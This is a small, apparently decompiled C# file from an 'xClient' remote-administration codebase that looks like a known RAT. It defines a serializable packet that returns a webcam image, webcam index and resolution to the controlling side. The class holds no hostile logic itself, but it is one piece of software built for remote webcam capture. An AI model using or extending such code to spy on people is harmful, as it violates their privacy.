using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetWebcamResponse : GInterface4
{
	public byte[] Image { get; set; }

	public int Webcam { get; set; }

	public int Resolution { get; set; }

	public GetWebcamResponse()
	{
	}

	public GetWebcamResponse(byte[] image, int webcam, int resolution)
	{
		Image = image;
		Webcam = webcam;
		Resolution = resolution;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
